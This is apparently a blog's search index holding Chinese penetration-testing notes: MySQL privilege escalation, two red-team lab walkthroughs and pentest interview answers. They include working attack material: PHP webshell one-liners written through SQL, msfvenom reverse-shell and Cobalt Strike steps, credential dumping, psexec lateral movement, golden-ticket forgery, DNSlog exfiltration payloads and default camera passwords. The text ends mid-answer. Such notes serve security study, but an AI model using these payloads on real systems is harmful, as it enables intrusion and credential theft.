<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>mysql提权</title>
    <url>/2020/09/07/mysql%E6%8F%90%E6%9D%83/</url>
    <content><![CDATA[<p>MySQL提权</p><p>1.UDF提权<br>udf是Mysql类提权的方式之一。前提是已知mysql中root的账号密码，我们在拿到webshell后，可以看网站根目录下的config.php里，一般都有mysql的账号密码。利用root权限，创建带有调用cmd函数的’udf.dll’(动态链接库)。当我们把’udf.dll’导出指定文件夹引入Mysql时，其中的调用函数拿出来当作mysql的函数使用。这样我们自定义的函数才被当作本机函数执行。在使用CREAT FUNCITON调用dll中的函数后，mysql账号转化为system权限，从而来提权。<br>2.MOF提权<br>托管对象格式 (MOF) 文件是创建和注册提供程序、事件类别和事件的简便方法。文件路径为：c:/windows/system32/wbme/mof/，其作用是每隔五秒就会去监控进程创建和死亡。MOF文件每五秒就会执行，而且是系统权限，通过mysql使用load_file 将文件写入/wbme/mof，然后系统每隔五秒就会执行一次我们上传的MOF。MOF当中有一段是vbs脚本，可以通过控制这段vbs脚本的内容让系统执行命令，进行提权。</p>]]></content>
      <categories>
        <category>笔记</category>
      </categories>
  </entry>
  <entry>
    <title>ATT&amp;CK红队评估实战靶场</title>
    <url>/2020/09/06/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA/</url>
    <content><![CDATA[<h1 id="ATT-amp-CK红队评估实战靶场-一"><a href="#ATT-amp-CK红队评估实战靶场-一" class="headerlink" title="ATT&amp;CK红队评估实战靶场(一)"></a>ATT&amp;CK红队评估实战靶场(一)</h1><p>搭建好环境后,用nmap进行扫描</p><blockquote>
<p>nmap -sV -p- 192.168.189.129</p>
</blockquote><p>发现开启80，3306端口</p><p>访问192.168.189.129:80网页</p><a id="more"></a>



<p>是php探针</p>
<p>发现最下面是mysql检测</p>
<p>尝试默认密码</p>
<p>root/root</p>
<p>成功</p>
<p>用nikto扫描目录</p>
<blockquote>
<p>nikto -h 192.168.189.129</p>
</blockquote>
<p>发现扫描到</p>
<p>phpinfo.php</p>
<p>phpmyadmin</p>
<p>用root/root登录phpmyadmin</p>
<p>尝试用 into outfile 文件写入shell</p>
<p>需要以下条件</p>
<blockquote>
<p>1、对web目录需要有写权限能够使用单引号</p>
<p>select user();</p>
<p>2、知道绝对路径</p>
<p>3、没有配置-secure-file-priv（在mysql的配置文件中需要有一句 secure_file_priv=” ，没有的话自行添加或修改）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SHOW VARIABLES LIKE &quot;secure_file_priv&quot;;</span><br></pre></td></tr></table></figure>
</blockquote>
<p>发现secure_file_priv是null</p>
<p>不能导入导出文件</p>
<p>尝试利用日志getshell</p>
<blockquote>
<p>show global variables like ‘%general%’</p>
</blockquote>
<p>发现是off</p>
<p>设置为on</p>
<blockquote>
<p>set global general_log=’ON’</p>
</blockquote>
<p> 将日志文件的存放位置修改为当前网站的根目录： </p>
<blockquote>
<p>set global  general_log_file = ‘C:/phpStudy/WWW/shell.php’</p>
</blockquote>
<p>然后执行语句</p>
<blockquote>
<p>SELECT ‘<?php @eval($_POST["bypass"]); ?>‘</p>
</blockquote>
<p>查看靶机上是否写入成功</p>
<p>有shell.php文件</p>
<blockquote>
<p>200906 22:25:39      153 Connect    root@localhost on<br>     153 Query    SET NAMES ‘utf8’ COLLATE ‘utf8_general_ci’<br>     153 Query    SELECT ‘<?php @eval($_POST["bypass"]); ?>‘<br>     153 Quit    </p>
</blockquote>
<p>然后用蚁剑连接shell</p>
<blockquote>
<p><a href="http://192.168.189.129/shell.php" target="_blank" rel="noopener">http://192.168.189.129/shell.php</a></p>
</blockquote>
<p>查询下权限</p>
<blockquote>
<p>whoami</p>
<p>god\administrator</p>
<p> 当前是个域管理员的权限 </p>
</blockquote>
<p>再查询下其他信息</p>
<blockquote>
<p>ipconfig /all</p>
<p>两张网卡</p>
<p>IPv4 地址 . . . . . . . . . . . . : 192.168.52.2(首选) </p>
<p>IPv4 地址 . . . . . . . . . . . . : 192.168.189.129(首选)</p>
<p>systeminfo    </p>
<p>net config workstation 查看当前登录域 和用户登录信息</p>
<p>ping owa.god.org   得到域控的ip</p>
<p>192.168.52.3</p>
</blockquote>
<p>为了方便后续内网横向移动，利用webshell 反弹shell至MSF 和 cobaltstrike： </p>
<p>使用msfvenom生成payload文件</p>
<blockquote>
<p>msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.189.128 LPORT=7777 -f raw &gt; test.php</p>
</blockquote>
<p>然后用蚁剑上传</p>
<p>然后用msf的handler模块监听</p>
<blockquote>
<p>use exploit/multi/handler</p>
<p>set payload php/meterpreter/reverse_tcp</p>
<p>set LHOST 192.168.189.128</p>
<p>set LPORT 7777</p>
<p>exploit</p>
</blockquote>
<p>远程访问文件</p>
<p>成功反弹shell</p>
<p>然后用 cobaltstrike 进行下一步操作</p>
<h2 id="部署TeamServer"><a href="#部署TeamServer" class="headerlink" title="部署TeamServer"></a>部署TeamServer</h2><blockquote>
<p>./teamserver &lt;你的ip&gt; &lt;密码&gt; </p>
</blockquote>
<h2 id="部署CobaltStrike"><a href="#部署CobaltStrike" class="headerlink" title="部署CobaltStrike"></a>部署CobaltStrike</h2><blockquote>
<p>./start </p>
</blockquote>
<p>然后</p>
<blockquote>
<p>cobalt strike-&gt;listeners-&gt;add</p>
<p>填入服务器ip和空闲的监听端口</p>
<p>接着生成payload</p>
<p>attacks-&gt;packages-&gt;windows executable</p>
<p>用蚁剑上传</p>
<p>start &lt;payload名字&gt;</p>
</blockquote>
<p>得到shell</p>
<blockquote>
<p>user是administrator</p>
</blockquote>
<p>然后用 svc-exe 提权</p>
<blockquote>
<p>先右键interact得到beacon</p>
<p>右键access-&gt;elevate</p>
<p>elevate svc-exe test</p>
<p>得到system权限</p>
</blockquote>
<p>用hashdump看下密码</p>
<blockquote>
<p>hashdump</p>
</blockquote>
<p>用logonpasswords抓取明文密码</p>
<blockquote>
<p>logonpasswords</p>
</blockquote>
<p>抓到hongrisec@2020 密码</p>
<p>接下来进行psexec传递</p>
<p>有两种情况</p>
<h2 id="目标机出网"><a href="#目标机出网" class="headerlink" title="目标机出网"></a>目标机出网</h2><blockquote>
<p>获取凭据后，需要对目标网段进行端口存活探测，缩小范围。探测方式比较多，本文仅依托CobalStrike本身完成，不借助其他工具。因为是psexec传递登录，这里仅需探测445端口。（ psexec：在主机上使用服务派生会话 ）</p>
<p>使用portscan命令：ip网段 — ports端口 — 扫描协议（arp、icmp、none）— 线程（实战不要过高）。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">`beacon&gt; portscan 192.168.144.0/24 445 arp 200`</span><br></pre></td></tr></table></figure>

<p>view-&gt;targets</p>
<p>jump-&gt;psexec</p>
<p>选择之前获取到的凭据信息（明文密文均可），此处选择明文，并确定接收的Listener与主机的Session。 </p>
</blockquote>
<h2 id="目标机不出网"><a href="#目标机不出网" class="headerlink" title="目标机不出网"></a>目标机不出网</h2><blockquote>
<p>实战中往往还会遇到通过某种方式，获取到目标内网中某台主机的系统权限，但是该主机处在隔离网络中，不能出网。因为CobalStrike服务端是搭建在互联网中的，通过常规方式是无法上线的，这里就需要利用已上线的主机，将它做一个Listener，实现链路上线CobalStrike。 </p>
<p>选择已经上线的主机创建listener smb</p>
<p>spawn smb </p>
<p>选择 Attacks-&gt;Packages-&gt;Windows Executable(Stageless)，支持导出该类型Listener对应的可执行文件或dll等。 </p>
<p>选择刚建立的Listener名字 </p>
<p>右键主机explore-&gt;file browser</p>
<p>上传刚才生成的payload到当前已上线的目标机中，还需要上传另一个工具PsExec.exe。 </p>
<p>在Beacon中使用PsExec工具将payload上传到不出网的目标机中，自动执行，上线。 </p>
<p>beacon&gt;shell C:\phpStudy\WWW\PsExec.exe -accepteula \192.168.52.2,192.168.52.3 -u Administrator -p hongrisec@2019 -d -c C:\phpStudy\WWW\beacon.exe</p>
</blockquote>
<p>也可以view-&gt;targets-&gt;jump-&gt;psexec</p>
<p>监听smb</p>
<h1 id="ATT-amp-CK红队评估实战靶场-二"><a href="#ATT-amp-CK红队评估实战靶场-二" class="headerlink" title="ATT&amp;CK红队评估实战靶场(二)"></a>ATT&amp;CK红队评估实战靶场(二)</h1><p>环境搭建完毕，扫描网段存活主机</p>
<blockquote>
<p>nmap -sV 192.168.111.0/24</p>
</blockquote>
<p>发现有</p>
<blockquote>
<p>192.168.111.80   80 135 139 445 1433 3389 7001</p>
<p>192.168.111.201 135 139 445 3389</p>
</blockquote>
<p> 192.168.111.80尝试下7001端口，发现是weblogic服务 </p>
<p>使用WeblogicScan.py扫描下可能存在的漏洞</p>
<blockquote>
<p>python3 WeblogicScan.py -u 192.168.111.80 -p 7001</p>
<p>得到以下内容</p>
<p>[192.168.111.80:7001] Weblogic Version Is 10.3.6.0<br>[+] [192.168.111.80:7001] Weblogic console address is exposed! The path is: <a href="http://192.168.111.80:7001/console/login/LoginForm.jsp" target="_blank" rel="noopener">http://192.168.111.80:7001/console/login/LoginForm.jsp</a><br>[+] [192.168.111.80:7001] Weblogic UDDI module is exposed! The path is: <a href="http://192.168.111.80:7001/uddiexplorer/" target="_blank" rel="noopener">http://192.168.111.80:7001/uddiexplorer/</a></p>
<p>[+] [192.168.111.80:7001] weblogic has a JAVA deserialization vulnerability:CVE-2019-2725</p>
</blockquote>
<p>可能存在cve-2019-2725</p>
<blockquote>
<p>用msf</p>
<p>search weblogic</p>
<p>use exploit/multi/misc/weblogic_deserialize_asyncresponseservice</p>
<p>设置option后</p>
<p>exploit</p>
<p>出现这个错误Exploit completed, but no session was created.</p>
<p>发现这个payload是针对unix环境的</p>
<p>show targets</p>
<p>set target 1</p>
<p>也可以使用 java 反序列化终极测试工具测试漏洞，工具地址：<a href="https://kfire.net/220.html" target="_blank" rel="noopener">https://kfire.net/220.html</a> </p>
</blockquote>
<p>成功getshell</p>
<p>然后</p>
<blockquote>
<p>shell</p>
<p>whoami</p>
<p>de1ay\administrator</p>
<p>然后查看开放端口</p>
<p>netstat -ano</p>
<p>查看网卡</p>
<p>ipconfig /all</p>
<p>得到dns服务器  10.10.10.10</p>
<p>beacon&gt;shell net config workstation   得到登录域信息</p>
<p>工作站域  de1ay.com</p>
<p>beacon&gt;net view    域内主机</p>
<p>pc 192.168.111.201</p>
<p>web 192.168.111.80</p>
<p>beacon&gt;shell net user /domain    域内用户</p>
<p>Administrator   krbtgt</p>
<p>beacon&gt;shell net group “domain controllers” /domain      查看域控制器名 </p>
<p>DC</p>
<p>beacon&gt;shell ping DC.de1ay.com     得到域控的ip</p>
<p>10.10.10.10</p>
</blockquote>
<p>然后把msf的shell派生到cs中</p>
<blockquote>
<p>background</p>
<p>use exploit/windows/local/payload_inject</p>
<p>set payload windows/meterpreter/reverse_http</p>
<p>set LhOST 192.168.111.128</p>
<p>set lport 8888</p>
<p>set session 1</p>
<p>set disablepayloadhandler true</p>
<p>run</p>
</blockquote>
<p>接着用mimikatz和hashdump抓取密码</p>
<blockquote>
<p>beacon&gt;logonpasswords</p>
<p>hashdump</p>
</blockquote>
<p>然后进行提权</p>
<p>用 svc-exe 提权</p>
<blockquote>
<p>先右键interact得到beacon</p>
<p>右键access-&gt;elevate</p>
<p>elevate svc-exe test</p>
<p>得到system权限</p>
</blockquote>
<p>信息收集完毕后</p>
<p>进行psexec传递</p>
<p>先创建smb</p>
<blockquote>
<p>可以右键session创建</p>
<p>也可以beacon&gt;spawn smb </p>
<p>再进行psexec传递</p>
<p>监听smb</p>
</blockquote>
<p>成功拿下域控</p>
<h3 id="域控信息收集"><a href="#域控信息收集" class="headerlink" title="域控信息收集"></a>域控信息收集</h3><blockquote>
<p>hashdump</p>
</blockquote>
<p>在域控获得KRBTGT账户NTLM密码哈希</p>
<p>82dfc71b72a11ef37d663047bc2088fb</p>
<blockquote>
<p>logonpasswords</p>
</blockquote>
<p>得到SID</p>
<p>S-1-5-21-2756371121-2868759905-3853650604</p>
<h3 id="黄金票据利用"><a href="#黄金票据利用" class="headerlink" title="黄金票据利用"></a>黄金票据利用</h3><p>黄金票据是伪造票据授予票据（TGT），也被称为认证票据。TGT仅用于向域控制器上的密钥分配中心（KDC）证明用户已被其他域控制器认证。</p>
<p>黄金票据的条件要求：<br>1.域名称<br>2.域的SID值<br>3.域的KRBTGT账户NTLM密码哈希<br>4.伪造用户名</p>
<p>原理这篇 <a href="https://www.freesion.com/article/6833306427/" target="_blank" rel="noopener">https://www.freesion.com/article/6833306427/</a> 博客讲的很详细。</p>
<p>黄金票据可以在拥有普通域用户权限和KRBTGT账号的哈希的情况下用来获取域管理员权限，上面已经获得域控的 system 权限了，还可以使用黄金票据做权限维持，当域控权限掉后，在通过域内其他任意机器伪造票据重新获取最高权限。</p>
<p>WEB机 权限机器-&gt;右键-&gt;Access-&gt;Golden Ticket</p>
<p><img src="/2020/09/06/ATT-CK%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0%E5%AE%9E%E6%88%98%E9%9D%B6%E5%9C%BA/%E5%AE%9E%E6%88%98%E4%BA%8C%E7%BB%93%E6%9E%9C.png" alt></p>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>域渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>shodan基础使用</title>
    <url>/2020/07/28/shodan%E5%9F%BA%E7%A1%80%E4%BD%BF%E7%94%A8/</url>
    <content><![CDATA[<p><a href="https://b404.gitbooks.io/shodan-manual/content/instruction.html" target="_blank" rel="noopener">shodan手册</a></p><p>几种摄像头关键词和默认密码</p><blockquote>
<p>JAWS为“CCTV”网络摄像头关键字 </p>
<p>常见弱密码：admin，空，111111,888888,123456；</p>
<p> NVR webserver </p>
<p>admin 888888是默认账号密码 </p>
</blockquote>]]></content>
      <categories>
        <category>笔记</category>
      </categories>
  </entry>
  <entry>
    <title>网上渗透面试题总结</title>
    <url>/2020/07/16/%E7%BD%91%E4%B8%8A%E6%B8%97%E9%80%8F%E9%9D%A2%E8%AF%95%E9%A2%98%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<p><a href="https://www.yuque.com/sunj3t/gwaph2/gf9szl" target="_blank" rel="noopener">安全面试总结</a></p><h3 id="问：MySQL写WebShell有几种方式，利用条件"><a href="#问：MySQL写WebShell有几种方式，利用条件" class="headerlink" title="问：MySQL写WebShell有几种方式，利用条件"></a>问：MySQL写WebShell有几种方式，利用条件</h3><p>答：</p><p>一、</p><blockquote>
<p> union select 后写入</p>
<p> lines terminated by 写入</p>
<p> lines starting by 写入</p>
<p> fields terminated by 写入</p>
<p> COLUMNS terminated by 写入</p>
</blockquote><a id="more"></a>



<p>二、</p>
<blockquote>
<p>root权限</p>
<p>GPC关闭（能使用单引号），magic_quotes_gpc=On</p>
<p>有绝对路径（读文件可以不用，写文件必须）</p>
<p>没有配置–secure-file-priv</p>
<p>成功条件：有读写的权限，有create、insert、select的权限</p>
</blockquote>
<h3 id="问：Sql-注入无回显的情况下，利用-DNSlog，mysql-下利用什么构造代码，mssql-下又如何？"><a href="#问：Sql-注入无回显的情况下，利用-DNSlog，mysql-下利用什么构造代码，mssql-下又如何？" class="headerlink" title="问：Sql 注入无回显的情况下，利用 DNSlog，mysql 下利用什么构造代码，mssql 下又如何？"></a>问：Sql 注入无回显的情况下，利用 DNSlog，mysql 下利用什么构造代码，mssql 下又如何？</h3><p>答：</p>
<blockquote>
<p> （1）没有回显的情况下，一般编写脚本，进行自动化注入。但与此同时，由于防火墙的存在，容易被封禁IP，可以尝试调整请求频率，有条件的使用代理池进行请求。</p>
<p> （2）此时也可以使用 DNSlog 注入，原理就是把服务器返回的结果放在域名中，然后读取 DNS 解析时的日志，来获取想要的信息。</p>
<p> （3）Mysql 中利用 load_file() 构造payload</p>
<p> ‘ and if((select load_file(concat(‘\\‘,(select database()),’.xxx.ceye.io\abc’))),1,0)# </p>
<p> （4）Mssql 下利用 master..xp_dirtree 构造payload</p>
<p> DECLARE @host varchar(1024);SELECT @host=(SELECT db_name())+’.xxx.ceye.io’;EXEC(‘master..xp_dirtree”&#39;+@host+’\foobar$”‘);</p>
</blockquote>
<h3 id="问：phpmyadmin写sehll的方法"><a href="#问：phpmyadmin写sehll的方法" class="headerlink" title="问：phpmyadmin写sehll的方法"></a>问：phpmyadmin写sehll的方法</h3><p>答：</p>
<p>一、常规导入shell的操作</p>
<blockquote>
<p> 创建数据表导出shell</p>
<p> CREATE TABLE <code>mysql</code>.<code>shadow9</code> (<code>content</code> TEXT NOT NULL );</p>
<p> INSERT INTO <code>mysql</code>.<code>shadow9</code> (<code>content</code> ) VALUES (‘<?php @eval($_POST[pass]);?>‘);</p>
<p> SELECT <code>content</code> FROM <code>shadow9</code> INTO OUTFILE ‘C:\phpStudy\WWW\90sec.php’;</p>
<p> DROP TABLE IF EXISTS <code>shadow9</code>;</p>
</blockquote>
<p>二、一句话导出shell：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select &apos;&lt;?php @eval($_POST[pass]);?&gt;&apos; into outfile &apos;c:/phpstudy/www/90sec.php&apos;;   select &apos;&lt;?php @eval($_POST[pass]);?&gt;&apos; into outfile &apos;c:\\phpstudy\\www\\90sec.php&apos;; select &apos;&lt;?php @eval($_POST[pass]);?&gt;&apos; into dumpfile &apos;c:\\phpstudy\\www\\bypass.php&apos;;</span><br></pre></td></tr></table></figure>

<p>三、日志备份获取shell</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">show global variables like &quot;%genera%&quot;;          //查询general_log配置 set global general_log=&apos;on&apos;;              //开启general log模式 SET global general_log_file=&apos;D:/phpStudy/WWW/cmd.php&apos;;    //设置日志文件保存路径 SELECT &apos;&lt;?php phpinfo();?&gt;&apos;;              //phpinfo()写入日志文件 set global general_log=&apos;off&apos;;              //关闭general_log模式</span><br></pre></td></tr></table></figure>

<h3 id="问：权限维持的方法"><a href="#问：权限维持的方法" class="headerlink" title="问：权限维持的方法"></a>问：权限维持的方法</h3><p>答：</p>
<p>留自启动后门方法很多,大多数都添加到服务,加注册表 加启动项，</p>
<p><strong>windows：</strong></p>
<blockquote>
<p> 1.替换系统文件类(shift后门,放大镜后门)</p>
<p> 2.修改注册表类</p>
<p> 自启动项、屏幕保护程序注册表、用户登陆初始化、登录脚本、映像劫持、影子账户、AppCertDlls注册表项、AppInit_DLLs注册表项、文件关联、用户登陆初始化、xx.Netsh Helper DLL</p>
<p> 3.文件类</p>
<p> 自启动文件夹、office Word StartUp劫持</p>
<p> 4.计划任务</p>
<p> schtasks 、WMI、bitsadmin</p>
</blockquote>
<p><strong>Linux</strong></p>
<blockquote>
<p> 1.预加载型动态链接库后门</p>
<p> 2.strace后门</p>
<p> 3.SSH 后门</p>
<p> 4.SUID后门</p>
<p> 5.inetd服务后门</p>
<p> 6.协议后门</p>
<p> 7.vim后门</p>
<p> 8.PAM后门</p>
<p> 9.进程注入</p>
<p> 10.Rootkit</p>
<p> 11.端口复用</p>
</blockquote>
<p><strong>MSF权限维持</strong></p>
<blockquote>
<p> 1.Persistence模块</p>
<p> 2.Metsvc 模块</p>
</blockquote>
<p><strong>Powershell权限维持</strong></p>
<p><strong>CS权限维持</strong></p>
<blockquote>
<p> SC命令</p>
</blockquote>
<h3 id="问：XXE-漏洞原理，代码审计如何寻找？"><a href="#问：XXE-漏洞原理，代码审计如何寻找？" class="headerlink" title="问：XXE 漏洞原理，代码审计如何寻找？"></a>问：XXE 漏洞原理，代码审计如何寻找？</h3><p>答：</p>
<p>（1）XXE （XML 外部实体注入）当 应用允许引用 XML 外部实体时，攻击者通过构造恶意内容，就可能进行任意文件读取、系统命令执行、内网端口探测、内网网站攻击等操作。</p>
<p>支持的协议如下图：</p>
<p><img src="https://image.3001.net/images/20200228/1582890916_5e58ffa4c2932.png!small" alt="img"></p>
<p><strong>Java</strong> :支持http、https、file、ftp、mailto、jar、netdoc、（1.8不支持gopher）</p>
<p>（2）审计函数，涉及到XML文件处理，都可能造成 XXE</p>
<p>（3）防御方法：禁用外部实体</p>
<h3 id="问：SSRF-禁用-127-0-0-1-后如何绕过，支持哪些协议？"><a href="#问：SSRF-禁用-127-0-0-1-后如何绕过，支持哪些协议？" class="headerlink" title="问：SSRF 禁用 127.0.0.1 后如何绕过，支持哪些协议？"></a>问：SSRF 禁用 127.0.0.1 后如何绕过，支持哪些协议？</h3><p>答：</p>
<blockquote>
<p> (1)利用进制转换</p>
<p> (2)利用DNS解析</p>
<p> (3)利用句号（127。0。0。1）</p>
<p> (4)利用[::]（http://[::]:80/）；</p>
<p> (5)利用@（<a href="http://example.com@127.0.0.1/" target="_blank" rel="noopener">http://example.com@127.0.0.1</a>）；</p>
<p> (6)利用短地址（<a href="http://dwz.cn/11SMa）；" target="_blank" rel="noopener">http://dwz.cn/11SMa）；</a></p>
<p> (7)协议（Dict://、SFTP://、TFTP://、LDAP://、Gopher://）</p>
</blockquote>
<h3 id="问：应急响应如何查找挖矿病毒，如何通过进程找到挖矿文件"><a href="#问：应急响应如何查找挖矿病毒，如何通过进程找到挖矿文件" class="headerlink" title="问：应急响应如何查找挖矿病毒，如何通过进程找到挖矿文件"></a>问：应急响应如何查找挖矿病毒，如何通过进程找到挖矿文件</h3><p>答：</p>
<blockquote>
<p> (1)任务管理器netstat -anp寻找异常进程PID看端口信息，然后根据端口信息定位到文件，cd /proc/PID （ls -l查看），</p>
<p> 禁用可疑的服务项。</p>
<p> (2)windows还可以用wmic分析进程参数</p>
</blockquote>
<h3 id="问：struts2框架漏洞原理"><a href="#问：struts2框架漏洞原理" class="headerlink" title="问：struts2框架漏洞原理"></a>问：struts2框架漏洞原理</h3><p>答：</p>
<blockquote>
<p> (1)struts是java的web框架</p>
<p> (2)采取OGNL表达式，处理view层数据字符串到controller层转换成java对象</p>
<p> (3)重点关注的编号加粗如下</p>
</blockquote>
<p>S2-057 影响范围非常小</p>
<p>S2-048 影响范围非常小</p>
<p><strong>S2-046 和S2-045一样</strong></p>
<p><strong>S2-045 影响范围较大—-通过Content-Type这个header头，进而执行命令，通过Strus2对错误消息处理进行回显</strong></p>
<p>S2-037 影响范围小</p>
<p>S2-032 影响范围小</p>
<p>S2-020 影响范围小</p>
<p>S2-019 影响范围一般</p>
<p><strong>S2-016 影响范围非常大</strong></p>
<p>S2-013 S2-016范围内</p>
<p>S2-009 S2-016范围内</p>
<p>S2-005 S2-016范围内</p>
<h3 id="问：JAVA反序列化原理"><a href="#问：JAVA反序列化原理" class="headerlink" title="问：JAVA反序列化原理"></a>问：JAVA反序列化原理</h3><p>答：</p>
<blockquote>
<p> （1）Java序列化指Java对象转换为字节序列的过程</p>
<p> （2）Java反序列化指字节序列恢复为Java对象的过程</p>
<p> （3） Commons-collections 爆出第一个漏洞开始，Java反序列化漏洞的事件就层出不穷。</p>
<p> （4）在Java中,利用ObjectInputStream的readObject方法进行对象读取</p>
<p> （5）可以深入了解 ysoserial有哪些gadgets</p>
</blockquote>
<h3 id="问：cors如何产生，有哪些利用方式？绕过同源策略的方法有哪些？jsonp跨域如何利用？"><a href="#问：cors如何产生，有哪些利用方式？绕过同源策略的方法有哪些？jsonp跨域如何利用？" class="headerlink" title="问：cors如何产生，有哪些利用方式？绕过同源策略的方法有哪些？jsonp跨域如何利用？"></a><strong>问：cors如何产生，有哪些利用方式？绕过同源策略的方法有哪些？jsonp跨域如何利用？</strong></h3><p>答：</p>
<p>（1）CORS全称是”跨域资源共享”（Cross-origin resource sharing）,Origin源未严格，从而造成跨域问题,允许浏览器向跨源服务器，发出<a href="http://www.ruanyifeng.com/blog/2012/09/xmlhttprequest_level_2.html" target="_blank" rel="noopener">XMLHttpRequest</a>请求</p>
<p>（2）Origin为*的时候，使用curl测试CORS，</p>
<p>curl <url> -H “Origin: <a href="https://evil.com/" target="_blank" rel="noopener">https://evil.com</a>” -I</url></p>
<p>再寻找的api接口是否有敏感信息泄漏。</p>
<p>（3）同源：协议相同、域名相同、端口相同，绕过同源策略限制的方法：</p>
<blockquote>
<p> 1、document.domain属性</p>
<p> 2、片段识别符（URL后加#号）</p>
<p> 3、window.name</p>
<p> 4、跨文档通信API</p>
<p> 5、JSONP</p>
<p> 6、CORS</p>
<p> 7、WebSockets</p>
</blockquote>
<p>（4）jsonp跨域利用：获取JSON数据并编码发送到远程服务器上</p>
<h3 id="问：phar协议如何利用，php伪协议input与post数据包发送有什么区别？"><a href="#问：phar协议如何利用，php伪协议input与post数据包发送有什么区别？" class="headerlink" title="问：phar协议如何利用，php伪协议input与post数据包发送有什么区别？"></a>问：phar协议如何利用，php伪协议input与post数据包发送有什么区别？</h3><p>答：</p>
<p>（1）可以Bypass一些waf，绕过上传限制</p>
<p>（2）Phar反序列化，Phar:// 伪协议读取phar文件时，会反序列化meta-data储存</p>
<p>（3） 区别</p>
<blockquote>
<p> 一、 application/x-www-form-urlencoded 或 multipart/form-data时</p>
<p> php://input 中是原始数据。</p>
<p> $_POST 中是关联数组，且没有上传控件的内容。</p>
<p> 二、enctype=”multipart/form-data” 时</p>
<p> php://input 是无效的。</p>
<p> 三、 Content-Type = “text/plain”时 </p>
<p> $_POST 不能获取post的数据， php://input可以。</p>
</blockquote>
<h3 id="问：内网服务器，如何进行信息收集"><a href="#问：内网服务器，如何进行信息收集" class="headerlink" title="问：内网服务器，如何进行信息收集"></a>问：内网服务器，如何进行信息收集</h3><h3 id="答："><a href="#答：" class="headerlink" title="答："></a>答：</h3><p>（1）手动，用一些小工具（批量看存活）</p>
<p>new user /domain查域、net view看共享、hosts文件内网ip域名映射、wifi记录和密码、浏览器中的密码、敏感文件、各类服务的配置文件中信息、历史命令、ssh私钥、FTP的连接信息、xshell等ssh连接工具的session文件，3389连接历史和被连接历史信息、某些内网api接口未授权访问</p>
<p>（2）扫描器</p>
<p>主机扫描、端口扫描、漏洞扫描、识别内网环境、密码爆破、抓密码</p>
<p>（3）留后门，抓信息</p>
<h3 id="问：docker远程api漏洞原理"><a href="#问：docker远程api漏洞原理" class="headerlink" title="问：docker远程api漏洞原理"></a>问：docker远程api漏洞原理</h3><p>答：</p>
<p>（1）docker swarm 是一个将docker集群变成单一虚拟的docker host工具，使用标准的Docker API，能够方便docker集群的管理和扩展，该未授权访问,可以通过url操作，执行docker命令。</p>
<p>（2）通过docker client执行目标服务器容器命令，docker是以root权限运行的</p>
<p>一、有运行ssh服务，/root/.ssh目录挂载到container内，，然后修改/.ssh/authorized_keys 文件，把自己的public key写进去</p>
<p>二、没有运行ssh服务，利用挂载写crontab定时任务，反弹一个shell</p>
<h3 id="问：ssrf怎么用redis写shell"><a href="#问：ssrf怎么用redis写shell" class="headerlink" title="问：ssrf怎么用redis写shell"></a>问：ssrf怎么用redis写shell</h3><p>答：</p>
<p>（1）SSRF服务端请求伪造</p>
<blockquote>
<p> 一、对内网扫描，获取 banner </p>
<p> 二、攻击运行在内网的应用，主要是使用 GET 参数就可以实现的攻击（比如 Struts2，sqli 等）</p>
<p> 三、利用协议读取本地文件</p>
<p> 四、 云计算环境AWS Google Cloud 环境可以调用内网操作 ECS 的 API</p>
</blockquote>
<p>（2）如webligic SSRF漏洞</p>
<p>通过SSRF的gopher协议操作内网的redis，利用redis将反弹shell写入crontab定时任务，url编码，将\r字符串替换成%0d%0a</p>
<h3 id="问：预编译能否100-防sql注入，如果不能，写一个"><a href="#问：预编译能否100-防sql注入，如果不能，写一个" class="headerlink" title="问：预编译能否100%防sql注入，如果不能，写一个"></a><strong>问：预编译能否100%防sql注入，如果不能，写一个</strong></h3><p>答：</p>
<p>不能。</p>
<p>一、</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$pdo-&gt;query(&apos;SET NAMES gbk&apos;);</span><br><span class="line">$var = &quot;\xbf\x27 OR 1=1 /*&quot;;</span><br><span class="line">$query = &apos;SELECT * FROM test WHERE name = ? LIMIT 1&apos;;</span><br><span class="line">$stmt = $pdo-&gt;prepare($query);</span><br><span class="line">$stmt-&gt;execute(array($var));</span><br></pre></td></tr></table></figure>

<p>类似于宽字节注入</p>
<p>二、</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$dbh = new PDO(&quot;txf&quot;);</span><br><span class="line">$name = $_GET[&apos;name&apos;];</span><br><span class="line">$stmt = $dbh-&gt;prepare(&apos;SELECT * FROM &apos; . $name . &apos; where username = :username&apos;);</span><br><span class="line">$stmt-&gt;execute( array(&apos;:username&apos; =&gt; $_REQUEST[&apos;username&apos;]) );</span><br></pre></td></tr></table></figure>

<p>参数name是一串数组，PDO不会生效</p>
<p>三、</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$stmt = $dbh-&gt;prepare(&apos;SELECT * FROM foo ORDER BY :userSuppliedData&apos;);</span><br></pre></td></tr></table></figure>

<p>PDO对DDL不生效</p>
<h3 id="问：WAF-绕过"><a href="#问：WAF-绕过" class="headerlink" title="问：WAF 绕过"></a>问：WAF 绕过</h3><p>答：</p>
<blockquote>
<p> 1 注释替换空格 </p>
<p> 2 字符集绕过</p>
<p> 3 chunked绕过</p>
<p> 4 上传请求 multipart 绕过</p>
<p> 5.参数污染</p>
<p> 。。。</p>
</blockquote>
<h3 id="问：SQL注入构造payload"><a href="#问：SQL注入构造payload" class="headerlink" title="问：SQL注入构造payload"></a>问：SQL注入构造payload</h3><p>答：</p>
<p>一、布尔型盲注</p>
<p>(1)mysql :</p>
<p>‘and (length(database()))&gt;10 –+</p>
<p>(2)oracle:</p>
<p>‘ and 1=(select decode(user,’SCOTT’,1,0) from dual) –</p>
<p>二、时间型盲注</p>
<p>and if(ascii(substr((select database()),1,1))&gt;115,1,sleep(5))</p>
<p>三、利用报错回显</p>
<p>(1) extractvalue</p>
